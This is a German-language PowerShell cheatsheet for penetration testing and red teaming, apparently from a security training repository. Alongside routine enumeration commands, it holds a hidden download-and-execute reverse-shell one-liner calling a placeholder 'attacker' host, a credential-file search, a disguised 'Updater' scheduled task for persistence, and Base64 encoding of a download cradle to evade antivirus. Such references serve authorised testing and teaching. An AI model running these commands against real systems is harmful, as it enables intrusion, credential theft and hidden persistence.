# ⚡ PowerShell Cheatsheet for Cybersecurity & Offensive Ops

## 📘 Ziel dieser Datei

Dieses Cheatsheet bietet eine schnelle Referenz für den **Einsatz von PowerShell** in Penetration Tests, Incident Response, Red Teaming und OSINT. Es enthält **sicherheitsrelevante, administrative und offensive Befehle**, gegliedert nach Szenarien.

> 🛡️ Hinweis: PowerShell ist ein äußerst mächtiges Werkzeug – bitte **nur in autorisierten Umgebungen** einsetzen!

---

## 🧭 Inhaltsverzeichnis

- [Systeminformationen](#systeminformationen)
- [Benutzer & Gruppen](#benutzer--gruppen)
- [Netzwerk- & Firewallinfos](#netzwerk--firewallinfos)
- [Dateisystem und Suche](#dateisystem-und-suche)
- [Prozesse & Dienste](#prozesse--dienste)
- [PowerShell Execution Policies](#execution-policies--umgehung)
- [Datei-Download & Remote Access](#download--remote-access)
- [PowerShell Recon & Enumeration](#powershell-recon--enum)
- [PowerShell als Angriffsplattform](#powershell-für-angreifer)
- [Persistenz via PowerShell](#persistenz-via-powershell)
- [Antivirus Evasion](#av-evasion-basics)
- [Nützliche Tools](#nützliche-module--projekte)

---

## 🖥️ Systeminformationen

```powershell
Get-ComputerInfo
systeminfo
hostname
Get-WmiObject -Class Win32_OperatingSystem
```

---

## 👤 Benutzer & Gruppen
```powershell
whoami /all
Get-LocalUser
net user
net localgroup administrators
Get-LocalGroupMember -Group "Administrators"
```

---

## 🌐 Netzwerk- & Firewallinfos

```powershell
ipconfig /all
Get-NetIPConfiguration
Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" }
Get-NetFirewallProfile
Get-NetFirewallRule
Test-NetConnection -ComputerName <IP> -Port <Port>
```

---

## 📂 Dateisystem und Suche

```powershell
Get-ChildItem -Recurse -Filter *.ps1
dir -Recurse -Filter *password*
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

## 🔧 Prozesse & Dienste

```powershell
Get-Process
tasklist
Get-Service
Get-WmiObject win32_service | Where { $_.State -eq "Running" }
```

---

## 🚧 Execution Policies & Umgehung

```powershell
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process
powershell.exe -ExecutionPolicy Bypass -File script.ps1
```

---

## 📥 Download & Remote Access
### 🔻 Datei herunterladen

```powershell
Invoke-WebRequest "http://ip/script.ps1" -OutFile "script.ps1"
```

### 💻 Remote Shell (reverse)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker/nc.ps1')
```

---

## 🔎 PowerShell Recon & Enum

### 🔐 Passwort-Reste / Credentials

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *pass*,*cred*,*vnc* | Select-String -Pattern "password"
```

### 🧠 Benutzerkontext

```powershell
Get-CimInstance Win32_LoggedOnUser
```

### 🗄️ Scheduled Tasks

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -like "*"}
```

## 💣 PowerShell für Angreifer

| Tool                      | Beschreibung                             |
| ------------------------- | ---------------------------------------- |
| `PowerView.ps1`           | AD-Recon, Trust-Mapping                  |
| `PowerUp.ps1`             | Local Privilege Escalation Checks        |
| `Invoke-Mimikatz`         | Credential Dumping (⚠️ AV blockiert oft)  |
| `SharpHound` (BloodHound) | AD Graph-Enum                            |
| `Empire`                  | PowerShell RAT Framework                 |
| `Powersploit`             | Offensive Module-Sammlung                |

--- 

## 📌 Persistenz via PowerShell
```powershell
# Persistenz per Scheduled Task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\evil.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger
```

--- 

## 🧪 AV-Evasion Basics (nur zu Lernzwecken!)
```powershell
# Base64-Encoding Payloads
$bytes = [System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://<ip>/payload.ps1')")
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

---

## 🔌 Nützliche Module & Projekte

| Tool / Modul   | Link                                                                                                                                     |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| PowerSploit    | [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)                                         |
| Nishang        | [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)                                                         |
| PowerUp        | [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) |
| Empire         | [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)                                                           |
| PowerSharpPack | [https://github.com/S3cur3Th1sSh1t/PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)                                     |

---

## 📁 Verknüpfte Dateien im Repository
- [windows_privilege_escalation.md](/04-os-enumeration/windows_privilege_escalation.md)
- [linux_privilege_escalation.md](/04-os-enumeration/linux_privilege_escalation.md)
- [red_team_tools.md](/05-red-teaming/red_team_tools.md)

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---

